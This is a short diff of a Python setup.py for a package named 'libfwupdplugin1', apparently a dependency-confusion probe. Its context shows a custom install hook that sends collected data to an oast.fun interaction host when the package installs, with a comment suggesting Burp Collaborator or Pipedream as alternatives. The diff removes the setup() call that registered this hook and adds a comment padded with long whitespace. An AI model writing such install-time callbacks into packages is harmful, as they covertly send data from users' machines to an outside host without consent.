@@ -16,10 +16,4 @@ class CustomInstall(install):
         requests.get("https://chc7ss72vtc0000ra0e0gesdhhwyyyyyb.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='libfwupdplugin1', #package name
-      version='1.0.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                   
